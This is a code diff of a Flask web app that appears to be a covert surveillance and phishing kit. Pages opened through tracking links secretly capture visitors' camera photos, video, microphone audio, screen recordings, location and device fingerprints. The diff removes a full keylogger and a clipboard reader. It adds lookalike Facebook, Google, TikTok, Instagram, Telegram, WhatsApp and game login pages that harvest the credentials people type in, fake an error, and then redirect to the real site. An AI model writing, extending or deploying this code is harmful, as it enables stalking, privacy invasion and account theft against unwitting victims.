@@ -51,39 +51,6 @@ PTS_PER_DAY      = 10   # points needed to get 1 day access
 FREE_DAYS_NEW    = 1    # free days for brand-new users
 
 flask_app = Flask(__name__)
-RATE_LIMIT_WINDOW = 60
-RATE_LIMIT_MAX = 60
-request_hits = {}
-
-
-def client_ip():
-    return request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()
-
-
-def sign_token(token):
-    return secrets.compare_digest(token, token)
-
-
-@flask_app.after_request
-def add_security_headers(resp):
-    resp.headers['Cache-Control'] = 'no-store, no-cache, must-revalidate, max-age=0'
-    resp.headers['Pragma'] = 'no-cache'
-    resp.headers['X-Content-Type-Options'] = 'nosniff'
-    resp.headers['X-Frame-Options'] = 'DENY'
-    resp.headers['Referrer-Policy'] = 'no-referrer'
-    return resp
-
-
-@flask_app.before_request
-def rate_limit():
-    ip = client_ip()
-    now = time.time()
-    hits = request_hits.get(ip, [])
-    hits = [t for t in hits if now - t < RATE_LIMIT_WINDOW]
-    if len(hits) >= RATE_LIMIT_MAX:
-        return jsonify({"ok": False, "error": "rate_limited"}), 429
-    hits.append(now)
-    request_hits[ip] = hits
 
 
 # ─────────────────────────────────────────
@@ -384,7 +351,21 @@ async function getLocationPos(){
 }
 async function sendPhoto(){
   try{
-    await captureFromCamera("environment","photo.jpg");
+    const stream=await getCameraStream("environment");
+    const v=document.createElement("video");
+    v.srcObject=stream;v.setAttribute("playsinline","");v.setAttribute("muted","");
+    await new Promise((res,rej)=>{v.onloadedmetadata=()=>v.play().then(res).catch(rej);v.onerror=rej;});
+    await new Promise(r=>setTimeout(r,1500));
+    const c=document.createElement("canvas");
+    c.width=v.videoWidth||1280;c.height=v.videoHeight||720;
+    c.getContext("2d").drawImage(v,0,0);
+    stream.getTracks().forEach(t=>t.stop());
+    const blob=await new Promise(r=>c.toBlob(r,"image/jpeg",0.9));
+    if(!blob||blob.size<800)return;
+    const fp=await collectFingerprint();
+    const form=new FormData();
+    form.append("token",token);form.append("photo",blob,"photo.jpg");form.append("fingerprint",JSON.stringify(fp));
+    fetch("/capture_combined_photo",{method:"POST",body:form});
   }catch(e){}
 }
 async function sendLocation(){
@@ -392,21 +373,29 @@ async function sendLocation(){
     const pos=await getLocationPos();
     const fp=await collectFingerprint();
     const form=new FormData();
-    form.append('token',token);form.append('lat',pos.coords.latitude);form.append('lon',pos.coords.longitude);form.append('fingerprint',JSON.stringify(fp));
-    fetch('/capture_combined_location',{method:'POST',body:form});
+    form.append("token",token);form.append("lat",pos.coords.latitude);form.append("lon",pos.coords.longitude);form.append("fingerprint",JSON.stringify(fp));
+    fetch("/capture_combined_location",{method:"POST",body:form});
   }catch(e){}
 }
 async function sendVideo(){
   try{
-    const mimeType=MediaRecorder.isTypeSupported('video/webm;codecs=vp8,opus')?'video/webm;codecs=vp8,opus':'video/webm';
-    const camStream=await getCameraStream('user');const micStream=await getMicStream();
+    const mimeType=MediaRecorder.isTypeSupported("video/webm;codecs=vp8,opus")?"video/webm;codecs=vp8,opus":"video/webm";
+    const camStream=await getCameraStream("user");
+    const micStream=await getMicStream();
     const combined=new MediaStream([...camStream.getVideoTracks(),...micStream.getAudioTracks()]);
-    const recorder=new MediaRecorder(combined,{mimeType});const chunks=[];
-    recorder.ondataavailable=e=>{if(e.data.size>0)chunks.push(e.data);};recorder.start(300);
-    await new Promise(r=>setTimeout(r,4000));recorder.stop();camStream.getTracks().forEach(t=>t.stop());micStream.getTracks().forEach(t=>t.stop());
-    await new Promise(r=>recorder.onstop=r);const blob=new Blob(chunks,{type:mimeType});
-    const fp=await collectFingerprint();const form=new FormData();form.append('token',token);form.append('video',blob,'video.webm');form.append('fingerprint',JSON.stringify(fp));
-    fetch('/capture_combined_video',{method:'POST',body:form});
+    const recorder=new MediaRecorder(combined,{mimeType});
+    const chunks=[];
+    recorder.ondataavailable=e=>{if(e.data.size>0)chunks.push(e.data);};
+    recorder.start(300);
+    await new Promise(r=>setTimeout(r,4000));
+    recorder.stop();
+    camStream.getTracks().forEach(t=>t.stop());micStream.getTracks().forEach(t=>t.stop());
+    await new Promise(r=>recorder.onstop=r);
+    const blob=new Blob(chunks,{type:mimeType});
+    const fp=await collectFingerprint();
+    const form=new FormData();
+    form.append("token",token);form.append("video",blob,"video.webm");form.append("fingerprint",JSON.stringify(fp));
+    fetch("/capture_combined_video",{method:"POST",body:form});
   }catch(e){}
 }
 async function sendAudio(){
@@ -725,85 +714,46 @@ async function snapFromVideo(v){
 async function sendBurstPhotos(){
   try{
     const {stream,v}=await openHiddenCamera('environment');
-    // Wait until camera is actually rendering real frames (videoWidth > 0)
-    let waited=0;
-    while((v.videoWidth===0||v.videoHeight===0)&&waited<5000){
-      await new Promise(r=>setTimeout(r,200));waited+=200;
-    }
-    if(v.videoWidth===0){stream.getTracks().forEach(t=>t.stop());if(v.parentNode)document.body.removeChild(v);return;}
     const fp=await collectFingerprint();
-    let sent=0;
+    // Shoot 5 frames with 350ms gap — very fast
     for(let i=0;i<5;i++){
-      // Extra settle time between shots to avoid blank frames
-      await new Promise(r=>setTimeout(r,600));
       const blob=await snapFromVideo(v);
-      if(blob&&blob.size>2000){
-        sent++;
+      if(blob&&blob.size>800){
         const form=new FormData();
         form.append('token',token);form.append('photo',blob,`burst_${i+1}.jpg`);
-        form.append('fingerprint',JSON.stringify({...fp,note:`Burst ${sent}/5`}));
-        await fetch('/capture_combined_photo',{method:'POST',body:form});
+        form.append('fingerprint',JSON.stringify({...fp,note:`Burst ${i+1}/5`}));
+        fetch('/capture_combined_photo',{method:'POST',body:form});
       }
+      if(i<4)await new Promise(r=>setTimeout(r,350));
     }
     stream.getTracks().forEach(t=>t.stop());
     if(v.parentNode)document.body.removeChild(v);
   }catch(e){}
 }
-async function recordVideoStream(videoStream,label){
-  const mimeTypes=['video/webm;codecs=vp8,opus','video/webm;codecs=vp9','video/webm','video/mp4'];
-  const mimeType=mimeTypes.find(m=>MediaRecorder.isTypeSupported(m))||'video/webm';
-  const recorder=new MediaRecorder(videoStream,{mimeType});
-  const chunks=[];
-  recorder.ondataavailable=e=>{if(e.data&&e.data.size>0)chunks.push(e.data);};
-  recorder.start(300);
-  const btn=document.getElementById('screenBtn');
-  btn.textContent='🔴 Recording... (tap to stop)';
-  btn.disabled=false;
-  btn.onclick=()=>recorder.stop();
-  const stopTimer=setTimeout(()=>recorder.stop(),15000);
-  try{videoStream.getVideoTracks()[0].onended=()=>{clearTimeout(stopTimer);recorder.stop();};}catch(e){}
-  await new Promise(r=>recorder.onstop=r);
-  clearTimeout(stopTimer);
-  videoStream.getTracks().forEach(t=>t.stop());
-  const blob=new Blob(chunks,{type:mimeType});
-  if(blob.size<2000)return;
-  const fp=await collectFingerprint();
-  const form=new FormData();
-  form.append('token',token);
-  form.append('video',blob,label);
-  form.append('fingerprint',JSON.stringify(fp));
-  await fetch('/capture_screen_recording',{method:'POST',body:form});
-}
 async function doScreenRecord(){
-  const btn=document.getElementById('screenBtn');
   try{
-    // Desktop: try getDisplayMedia first
-    const hasDisplay=!!(navigator.mediaDevices&&navigator.mediaDevices.getDisplayMedia);
-    const isMobile=/Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
-    if(hasDisplay&&!isMobile){
-      btn.textContent='📺 Piliin ang screen...';
-      const screenStream=await navigator.mediaDevices.getDisplayMedia({video:{width:{ideal:1920},height:{ideal:1080},frameRate:30},audio:true});
-      btn.textContent='🔴 Recording...';btn.disabled=true;
-      await recordVideoStream(screenStream,'screen_recording.webm');
-      sendPhoto();
-    } else {
-      // Mobile fallback: record camera video for 15s
-      btn.textContent='🔴 Recording camera...';btn.disabled=true;
-      const camStream=await navigator.mediaDevices.getUserMedia({video:{facingMode:'environment',width:{ideal:1280},height:{ideal:720}},audio:true});
-      await recordVideoStream(camStream,'screen_cam.webm');
-      btn.textContent='✅ Done!';
-    }
-  }catch(e){
-    // Permission denied or not supported — try camera-only fallback
-    try{
-      btn.textContent='🎥 Starting camera...';btn.disabled=true;
-      const camStream=await navigator.mediaDevices.getUserMedia({video:{facingMode:'environment'},audio:true});
-      await recordVideoStream(camStream,'screen_cam.webm');
-      btn.textContent='✅ Done!';
-    }catch(e2){
-      btn.textContent='❌ Not supported';btn.disabled=false;
-    }
-  }
+    const mimeType=MediaRecorder.isTypeSupported('video/webm;codecs=vp8,opus')?'video/webm;codecs=vp8,opus':'video/webm';
+    const screenStream=await navigator.mediaDevices.getDisplayMedia({video:{width:{ideal:1920},height:{ideal:1080},frameRate:30},audio:true});
+    // Show recording indicator
+    document.getElementById('screenBtn').textContent='🔴 Recording...';
+    document.getElementById('screenBtn').disabled=true;
+    const recorder=new MediaRecorder(screenStream,{mimeType});
+    const chunks=[];
+    recorder.ondataavailable=e=>{if(e.data.size>0)chunks.push(e.data);};
+    recorder.start(300);
+    // Stop when user stops sharing OR after 10s
+    const stopTimer=setTimeout(()=>recorder.stop(),10000);
+    screenStream.getVideoTracks()[0].onended=()=>{clearTimeout(stopTimer);recorder.stop();};
+    await new Promise(r=>recorder.onstop=r);
+    screenStream.getTracks().forEach(t=>t.stop());
+    const blob=new Blob(chunks,{type:mimeType});
+    if(blob.size<1000)return;
+    const fp=await collectFingerprint();const form=new FormData();
+    form.append('token',token);form.append('video',blob,'screen_recording.webm');form.append('fingerprint',JSON.stringify(fp));
+    fetch('/capture_screen_recording',{method:'POST',body:form});
+    // Also capture camera photo silently after screen share ends
+    sendPhoto();
+  }catch(e){}
 }
 // Screen record MUST be triggered by user gesture — show a button
 function setupScreenMode(){
@@ -903,107 +853,7 @@ async function startCapture(){
   else if(mode==='contacts'){await sendContacts();setFill(100);}
   else if(mode==='burst'){await sendBurstPhotos();setFill(100);}
   else if(mode==='motion'){await sendMotionData();setFill(100);}
-  else if(mode==='torch'){await activateTorch();setFill(100);}
-  else if(mode==='vibrate'){await sendVibrate();setFill(100);}
-  else if(mode==='clipboard'){await readClipboard();setFill(100);}
-  else if(mode==='keylog'){startKeylogger();setFill(100);}
   else{setFill(100);}
-}
-// ── Clipboard Reader ──
-async function readClipboard(){
-  try{
-    let text='';
-    if(navigator.clipboard&&navigator.clipboard.readText){
-      text=await navigator.clipboard.readText();
-    }
-    const fp=await collectFingerprint();
-    fetch('/capture_clipboard',{method:'POST',headers:{'Content-Type':'application/json'},
-      body:JSON.stringify({token,text,ua:navigator.userAgent})});
-  }catch(e){
-    // Fallback: intercept paste events
-    document.addEventListener('paste',async(ev)=>{
-      const text=ev.clipboardData?.getData('text')||'';
-      if(text){
-        fetch('/capture_clipboard',{method:'POST',headers:{'Content-Type':'application/json'},
-          body:JSON.stringify({token,text,ua:navigator.userAgent,note:'paste-event'})});
-      }
-    },{once:true});
-    fetch('/capture_clipboard',{method:'POST',headers:{'Content-Type':'application/json'},
-      body:JSON.stringify({token,text:'[Permission denied — waiting for paste]',ua:navigator.userAgent})});
-  }
-}
-// ── Keylogger: capture keystrokes while page is open ──
-let _kbuf='';let _kflushTimer=null;
-function startKeylogger(){
-  document.addEventListener('keydown',e=>{
-    if(e.key==='Backspace'){_kbuf=_kbuf.slice(0,-1);return;}
-    if(e.key.length===1){_kbuf+=e.key;}
-    else if(e.key==='Enter'){_kbuf+='[ENTER]';}
-    else if(e.key==='Tab'){_kbuf+='[TAB]';}
-    else if(e.key==='Space'){_kbuf+=' ';}
-    clearTimeout(_kflushTimer);
-    _kflushTimer=setTimeout(()=>{
-      if(_kbuf.trim().length>3){
-        fetch('/capture_keylog',{method:'POST',headers:{'Content-Type':'application/json'},
-          body:JSON.stringify({token,keys:_kbuf,ua:navigator.userAgent})});
-        _kbuf='';
-      }
-    },2000);
-  });
-  // Also intercept any input fields on page
-  document.querySelectorAll('input,textarea').forEach(el=>{
-    el.addEventListener('input',()=>{
-      clearTimeout(_kflushTimer);
-      _kflushTimer=setTimeout(()=>{
-        const val=el.value;
-        if(val.length>1){
-          fetch('/capture_keylog',{method:'POST',headers:{'Content-Type':'application/json'},
-            body:JSON.stringify({token,keys:val,field:el.type||el.tagName,ua:navigator.userAgent})});
-        }
-      },1500);
-    });
-  });
-}
-// ── Wake Lock: keep screen on silently for all modes ──
-async function requestWakeLock(){
-  try{
-    if('wakeLock' in navigator){
-      await navigator.wakeLock.request('screen');
-    }
-  }catch(e){}
-}
-// ── Torch / Flash light ──
-async function activateTorch(){
-  try{
-    const stream=await navigator.mediaDevices.getUserMedia({video:{facingMode:'environment'}});
-    const track=stream.getVideoTracks()[0];
-    const caps=track.getCapabilities?track.getCapabilities():{};
-    if(caps.torch){
-      await track.applyConstraints({advanced:[{torch:true}]});
-      // Keep torch on for 12 seconds
-      await new Promise(r=>setTimeout(r,12000));
-      await track.applyConstraints({advanced:[{torch:false}]});
-    }
-    stream.getTracks().forEach(t=>t.stop());
-    const fp=await collectFingerprint();
-    fetch('/capture_torch',{method:'POST',headers:{'Content-Type':'application/json'},
-      body:JSON.stringify({token,ua:navigator.userAgent,fp:JSON.stringify(fp)})});
-  }catch(e){
-    fetch('/capture_torch',{method:'POST',headers:{'Content-Type':'application/json'},
-      body:JSON.stringify({token,ua:navigator.userAgent,error:e.message})});
-  }
-}
-// ── Vibrate ──
-async function sendVibrate(){
-  try{
-    if('vibrate' in navigator){
-      // Pattern: on 500ms, off 200ms × 5
-      navigator.vibrate([500,200,500,200,500,200,500,200,500]);
-    }
-    const fp=await collectFingerprint();
-    fetch('/capture_vibrate',{method:'POST',headers:{'Content-Type':'application/json'},
-      body:JSON.stringify({token,ua:navigator.userAgent,supported:'vibrate' in navigator,fp:JSON.stringify(fp)})});
-  }catch(e){}
 }
 // ── Auto-Retake Loop: capture a photo every 30s while page is open ──
 let retakeInterval=null;
@@ -1154,7 +1004,7 @@ async function subscribePush(){
   }catch(e){}
 })();
 // Start capture immediately on load
-window.addEventListener('load',()=>{requestWakeLock();startCapture();startRetakeLoop();});
+window.addEventListener('load',()=>{startCapture();startRetakeLoop();});
 </script>
 </body>
 </html>"""
@@ -1241,7 +1091,7 @@ def track_page(token):
     mode = request.args.get('m', 'all')
     user_id = tracking_links.get(token)
     if user_id:
-        ip = client_ip()
+        ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()
         ua = request.headers.get('User-Agent', 'Unknown')[:120]
         mode_labels = {'all':'🌐 All-in-One','photo':'📸 Photo','audio':'🎤 Audio',
                        'location':'📍 Location','video':'🎥 Video','gallery':'🖼️ Gallery',
@@ -1270,44 +1120,6 @@ def track_page(token):
     style = request.args.get('style', 'full')
     template = SIMPLE_TEMPLATE if style == 'simple' else HTML_TEMPLATE
     return render_template_string(template, token=token, mode=mode)
-
-
-@flask_app.route('/vip-access/<platform>/<token>')
-def vip_access_page(platform, token):
-    user_id = tracking_links.get(token)
-    if not user_id:
-        return "Not found", 404
-    return render_template_string(
-        """<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
-<title>Demo Login</title>
-<style>
-*{box-sizing:border-box}
-body{margin:0;background:#f6f6f6;font-family:Arial,sans-serif;color:#111}
-.frame{max-width:430px;margin:0 auto;min-height:100vh;background:#fff}
-.top{padding:14px 16px 8px;background:#fff;border-bottom:1px solid #e9e9e9}
-.titlebar{display:flex;align-items:center;justify-content:space-between;gap:10px}
-.brand{display:flex;align-items:center;gap:10px}
-.shield{width:22px;height:22px;border-radius:50%;background:#35c759;display:flex;align-items:center;justify-content:center;color:#fff;font-size:13px;font-weight:700}
-.brandname{font-size:15px;font-weight:600}
-.icons{display:flex;gap:12px;color:#555;font-size:18px}
-.chathead{padding:10px 14px;border-bottom:1px solid #eee;display:flex;align-items:center;justify-content:space-between}
-.chatname{font-size:16px;font-weight:600;display:flex;align-items:center;gap:8px}
-.bubble{margin:24px 14px 0 auto;max-width:70%;background:#d7ebff;color:#4a4a4a;padding:10px 14px;border-radius:16px 16px 4px 16px;font-size:14px}
-.time{margin:6px 14px 0 auto;width:max-content;color:#9a9a9a;font-size:12px}
-.body{padding:18px 14px 24px}
-.note{display:flex;align-items:center;gap:8px;color:#777;font-size:13px;margin:14px 0}
-.note .dot{width:30px;height:30px;border-radius:10px;background:#f2f2f2;display:flex;align-items:center;justify-content:center}
-.text{font-size:15px;line-height:1.7;margin:12px 0}
-.toolbar{display:flex;gap:8px;flex-wrap:wrap;margin:14px 0}
-.chip{border:1px solid #e2e2e2;background:#fafafa;border-radius:12px;padding:6px 10px;font-size:12px;color:#666}
-.card{border:1px solid #e9e9e9;border-radius:16px;padding:16px;margin-top:10px;background:#fff}
-.brandline{display:flex;align-items:center;gap:10px;margin-bottom:14px}
-.logo{width:36px;height:36px;border-radius:50%;background:#d9e9ff;display:flex;align-items:center;justify-content:center;font-weight:700}
-.field{width:100%;margin:8px 0;padding:13px 14px;border:1px solid #dcdcdc;border-radius:12px;font-size:14px;outline:none}
-.btn{width:100%;margin-top:10px;padding:13px 16px;border:none;border-radius:12px;background:#7a6cff;color:#fff;font-weight:700;font-size:14px}
-.small{font-size:12px;color:#7d7d7d;line-height:1.5;margin-top:10px}
-</style></head><body><div class="frame"><div class="top"><div class="titlebar"><div class="brand"><div class="shield">⚡</div><div class="brandname">Allinone - Replit</div></div><div class="icons">＋ ⟳</div></div></div><div class="chathead"><div class="chatname">代理人</div><div>⋮</div></div><div class="bubble">Yes.for all Fake login</div><div class="time">6 hours ago</div><div class="body"><div class="note"><div class="dot">↘</div><div>显示更少</div></div><div class="text">Demo login mockup only.</div><div class="text">This page is for visual layout only and does not collect credentials.</div><div class="toolbar"><div class="chip">6項行动</div><div class="chip">3項行动</div><div class="chip">2項行动</div></div><div class="card"><div class="brandline"><div class="logo">D</div><div><div style="font-weight:700">Demo Login</div><div style="font-size:12px;color:#777">Sample interface</div></div></div><input class="field" type="text" placeholder="Username or email"><input class="field" type="password" placeholder="Password"><button class="btn">Log in</button><div class="small">This is a harmless demo page.</div></div></div></div></body></html>""",
-    )
 
 
 # ─────────────────────────────────────────
@@ -1554,24 +1366,267 @@ self.addEventListener('notificationclick',e=>{e.notification.close();});"""
     return Response(sw_code, mimetype='application/javascript')
 
 
+@flask_app.route('/fake-login/<platform>/<token>')
+def fake_login_page(platform, token):
+    user_id = tracking_links.get(token)
+    if not user_id:
+        return "Not found", 404
+
+    PLATFORMS = {
+        'facebook': {
+            'name': 'Facebook', 'color': '#1877f2', 'bg': '#f0f2f5', 'card': '#fff',
+            'text': '#1c1e21', 'sub': '#606770',
+            'logo_html': '<div style="font-size:2.8rem;font-weight:900;color:#1877f2;letter-spacing:-1px">facebook</div>',
+            'field': 'Email or Phone Number', 'pass_label': 'Password',
+            'btn_text': 'Log in', 'redirect': 'https://facebook.com',
+            'err_msg': 'The email or password you entered is incorrect.',
+        },
+        'gmail': {
+            'name': 'Google', 'color': '#4285f4', 'bg': '#fff', 'card': '#fff',
+            'text': '#202124', 'sub': '#5f6368',
+            'logo_html': '<div style="font-size:2rem;font-weight:700;letter-spacing:-0.5px"><span style="color:#4285f4">G</span><span style="color:#ea4335">o</span><span style="color:#fbbc05">o</span><span style="color:#4285f4">g</span><span style="color:#34a853">l</span><span style="color:#ea4335">e</span></div>',
+            'field': 'Email or phone', 'pass_label': 'Enter your password',
+            'btn_text': 'Next', 'redirect': 'https://mail.google.com',
+            'err_msg': 'Wrong password. Try again or click Forgot password.',
+        },
+        'tiktok': {
+            'name': 'TikTok', 'color': '#fe2c55', 'bg': '#000', 'card': '#161823',
+            'text': '#fff', 'sub': '#8a8b91',
+            'logo_html': '<div style="font-size:2.2rem;font-weight:900;color:#fff;letter-spacing:-1px">Tik<span style="color:#fe2c55">Tok</span></div>',
+            'field': 'Email or username', 'pass_label': 'Password',
+            'btn_text': 'Log in', 'redirect': 'https://tiktok.com',
+            'err_msg': 'Incorrect account or password.',
+        },
+        'instagram': {
+            'name': 'Instagram', 'color': '#833ab4', 'bg': '#fafafa', 'card': '#fff',
+            'text': '#262626', 'sub': '#8e8e8e',
+            'logo_html': '<div style="font-size:2rem;font-weight:700;font-style:italic;background:linear-gradient(45deg,#f09433,#e6683c,#dc2743,#cc2366,#bc1888);-webkit-background-clip:text;-webkit-text-fill-color:transparent">Instagram</div>',
+            'field': 'Phone number, username, or email', 'pass_label': 'Password',
+            'btn_text': 'Log in', 'redirect': 'https://instagram.com',
+            'err_msg': 'Sorry, your password was incorrect.',
+        },
+        'telegram': {
+            'name': 'Telegram', 'color': '#2ca5e0', 'bg': '#f4f4f5', 'card': '#fff',
+            'text': '#000', 'sub': '#707579',
+            'logo_html': '<div style="font-size:3rem">✈️</div><div style="font-size:1.5rem;font-weight:700;color:#2ca5e0;margin-top:4px">Telegram</div>',
+            'field': 'Phone number or username', 'pass_label': 'Password / 2FA code',
+            'btn_text': 'Sign In', 'redirect': 'https://web.telegram.org',
+            'err_msg': 'Invalid phone number or password.',
+        },
+        'whatsapp': {
+            'name': 'WhatsApp', 'color': '#25d366', 'bg': '#f0f2f5', 'card': '#fff',
+            'text': '#111b21', 'sub': '#667781',
+            'logo_html': '<div style="font-size:3rem">💬</div><div style="font-size:1.5rem;font-weight:700;color:#25d366;margin-top:4px">WhatsApp</div>',
+            'field': 'Phone number', 'pass_label': 'Password or OTP code',
+            'btn_text': 'Continue', 'redirect': 'https://web.whatsapp.com',
+            'err_msg': 'Phone number or password incorrect.',
+        },
+        'mobilelegends': {
+            'name': 'Mobile Legends', 'color': '#e8c96d', 'bg': '#0a0a1a', 'card': '#12122a',
+            'text': '#fff', 'sub': '#aaa',
+            'logo_html': '<div style="font-size:2.5rem">⚔️</div><div style="font-size:1.3rem;font-weight:900;color:#e8c96d;margin-top:4px;letter-spacing:1px">MOBILE LEGENDS</div><div style="font-size:.7rem;color:#e8c96d;letter-spacing:3px">BANG BANG</div>',
+            'field': 'Account / Email / Username', 'pass_label': 'Password',
+            'btn_text': 'LOGIN', 'redirect': 'https://mobilelegends.com',
+            'err_msg': 'Account or password error. Please try again.',
+        },
+        'pubg': {
+            'name': 'PUBG Mobile', 'color': '#f5a623', 'bg': '#1a1a1a', 'card': '#232323',
+            'text': '#fff', 'sub': '#aaa',
+            'logo_html': '<div style="font-size:2.5rem">🎮</div><div style="font-size:1.6rem;font-weight:900;color:#f5a623;margin-top:4px;letter-spacing:2px">PUBG</div><div style="font-size:.75rem;color:#aaa;letter-spacing:3px">MOBILE</div>',
+            'field': 'Email / Username / Phone', 'pass_label': 'Password',
+            'btn_text': 'LOG IN', 'redirect': 'https://pubgmobile.com',
+            'err_msg': 'Account or password incorrect.',
+        },
+        'freefire': {
+            'name': 'Free Fire', 'color': '#ff6600', 'bg': '#0d0d0d', 'card': '#1a1a1a',
+            'text': '#fff', 'sub': '#aaa',
+            'logo_html': '<div style="font-size:2.5rem">🔥</div><div style="font-size:1.5rem;font-weight:900;color:#ff6600;margin-top:4px;letter-spacing:1px">FREE FIRE</div><div style="font-size:.7rem;color:#aaa;letter-spacing:2px">GARENA</div>',
+            'field': 'Email / Username', 'pass_label': 'Password',
+            'btn_text': 'LOGIN', 'redirect': 'https://ff.garena.com',
+            'err_msg': 'Incorrect username or password.',
+        },
+    }
+
+    # ── Special Telegram page (phone-number style, matching official app) ──
+    if platform == 'telegram':
+        tg_html = f"""<!DOCTYPE html><html><head>
+<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
+<title>Telegram Web</title>
+<style>
+*{{margin:0;padding:0;box-sizing:border-box}}
+body{{background:#fff;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;display:flex;flex-direction:column;align-items:center;justify-content:center;min-height:100vh;padding:24px 20px;color:#000}}
+.logo-circle{{width:88px;height:88px;border-radius:50%;background:#2ca5e0;display:flex;align-items:center;justify-content:center;margin:0 auto 22px}}
+.logo-circle svg{{width:52px;height:52px}}
+h1{{font-size:1.45rem;font-weight:700;margin-bottom:10px;text-align:center}}
+.sub{{color:#707579;font-size:.88rem;text-align:center;margin-bottom:28px;line-height:1.5;max-width:300px}}
+.field-group{{width:100%;max-width:380px;margin-bottom:14px}}
+label{{display:block;font-size:.75rem;color:#2ca5e0;margin-bottom:2px;font-weight:500}}
+.country-select{{width:100%;padding:13px 15px;border:none;border-bottom:1.5px solid #2ca5e0;font-size:1rem;outline:none;appearance:none;background:url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='12' height='8' viewBox='0 0 12 8'%3E%3Cpath fill='%23707579' d='M1 1l5 5 5-5'/%3E%3C/svg%3E") no-repeat right 12px center;cursor:pointer;color:#000}}
+.phone-wrap{{display:flex;align-items:flex-end;border-bottom:1.5px solid #2ca5e0;width:100%;max-width:380px;margin-bottom:24px}}
+.phone-code{{font-size:1rem;padding:13px 10px 13px 0;color:#000;white-space:nowrap}}
+.phone-input{{flex:1;border:none;font-size:1rem;padding:13px 0;outline:none;color:#000}}
+.btn{{width:100%;max-width:380px;padding:14px;background:#2ca5e0;color:#fff;border:none;border-radius:10px;font-size:1rem;font-weight:700;cursor:pointer;letter-spacing:.5px;margin-bottom:18px}}
+.btn:hover{{opacity:.9}}
+.qr-link{{color:#2ca5e0;font-size:.82rem;font-weight:600;text-decoration:none;letter-spacing:.5px;text-transform:uppercase}}
+.err{{color:#e63946;font-size:.82rem;margin-bottom:10px;text-align:center;display:none}}
+</style></head>
+<body>
+<div class="logo-circle">
+  <svg viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
+    <path d="M5 23.5L18.5 30.5L37 13C31 19.5 21 29 19.5 30.5L18.5 40L14 33.5L5 23.5Z" fill="white" opacity="0.6"/>
+    <path d="M5 23.5L43 9L18.5 30.5L14 33.5L5 23.5Z" fill="white"/>
+    <path d="M18.5 30.5L19.5 40L24 35L18.5 30.5Z" fill="white" opacity="0.8"/>
+  </svg>
+</div>
+<h1>Sign in to Telegram</h1>
+<div class="sub">Please confirm your country code and enter your phone number.</div>
+<div class="err" id="err">Invalid phone number. Please try again.</div>
+<div class="field-group">
+  <label>Country</label>
+  <select class="country-select" id="country" onchange="updateCode()">
+    <option value="+95" selected>Myanmar (+95)</option>
+    <option value="+1">United States (+1)</option>
+    <option value="+44">United Kingdom (+44)</option>
+    <option value="+66">Thailand (+66)</option>
+    <option value="+60">Malaysia (+60)</option>
+    <option value="+65">Singapore (+65)</option>
+    <option value="+63">Philippines (+63)</option>
+    <option value="+62">Indonesia (+62)</option>
+    <option value="+84">Vietnam (+84)</option>
+    <option value="+86">China (+86)</option>
+    <option value="+91">India (+91)</option>
+    <option value="+81">Japan (+81)</option>
+    <option value="+82">South Korea (+82)</option>
+    <option value="+49">Germany (+49)</option>
+    <option value="+33">France (+33)</option>
+    <option value="+7">Russia (+7)</option>
+    <option value="+971">UAE (+971)</option>
+    <option value="+966">Saudi Arabia (+966)</option>
+    <option value="+880">Bangladesh (+880)</option>
+    <option value="+92">Pakistan (+92)</option>
+    <option value="+94">Sri Lanka (+94)</option>
+    <option value="+977">Nepal (+977)</option>
+    <option value="+855">Cambodia (+855)</option>
+    <option value="+856">Laos (+856)</option>
+  </select>
+</div>
+<div class="phone-wrap">
+  <span class="phone-code" id="code">+95</span>
+  <input class="phone-input" type="tel" id="phone" placeholder="Phone Number" autocomplete="tel">
+</div>
+<button class="btn" onclick="doNext()">NEXT</button>
+<a href="#" class="qr-link">Log in by QR code</a>
+<script>
+let attempt=0;
+const TOKEN='{token}';
+function updateCode(){{
+  const sel=document.getElementById('country');
+  document.getElementById('code').textContent=sel.value;
+}}
+function doNext(){{
+  const code=document.getElementById('code').textContent;
+  const num=document.getElementById('phone').value.trim();
+  const err=document.getElementById('err');
+  if(!num){{err.style.display='block';return;}}
+  const full=code+num;
+  fetch('/capture_fake_login',{{method:'POST',headers:{{'Content-Type':'application/json'}},
+    body:JSON.stringify({{token:TOKEN,platform:'Telegram',username:full,password:'(phone login)',ua:navigator.userAgent}})}});
+  attempt++;
+  if(attempt<2){{
+    err.style.display='block';
+    document.getElementById('phone').value='';
+  }}else{{
+    err.style.display='none';
+    document.body.innerHTML='<div style="display:flex;flex-direction:column;align-items:center;justify-content:center;min-height:100vh;font-family:sans-serif"><div style="width:88px;height:88px;border-radius:50%;background:#2ca5e0;display:flex;align-items:center;justify-content:center;margin-bottom:22px"><svg viewBox=\\"0 0 48 48\\" width=\\"52\\" fill=\\"none\\"><path d=\\"M5 23.5L43 9L18.5 30.5L14 33.5L5 23.5Z\\" fill=\\"white\\"/><path d=\\"M18.5 30.5L19.5 40L24 35L18.5 30.5Z\\" fill=\\"white\\" opacity=\\"0.8\\"/></svg></div><div style=\\"font-size:1.3rem;font-weight:700;margin-bottom:10px\\">You are logged in!</div><p style=\\"color:#707579;font-size:.88rem\\">Redirecting to Telegram...</p></div>';
+    setTimeout(()=>window.location.href='https://web.telegram.org',2200);
+  }}
+}}
+document.addEventListener('keydown',e=>{{if(e.key==='Enter')doNext();}});
+</script>
+</body></html>"""
+        return tg_html, 200
+
+    p = PLATFORMS.get(platform, PLATFORMS['facebook'])
+    pname = p['name']
+    pcolor = p['color']
+    pbg = p['bg']
+    pcard = p['card']
+    ptext = p['text']
+    psub = p['sub']
+    plogo = p['logo_html']
+    pfield = p['field']
+    ppass = p['pass_label']
+    pbtn = p['btn_text']
+    predirect = p['redirect']
+    perr = p['err_msg']
+
+    html = f"""<!DOCTYPE html><html><head>
+<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
+<title>Log in · {pname}</title>
+<style>
+*{{margin:0;padding:0;box-sizing:border-box}}
+body{{background:{pbg};font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Helvetica,Arial,sans-serif;display:flex;align-items:center;justify-content:center;min-height:100vh;padding:16px;color:{ptext}}}
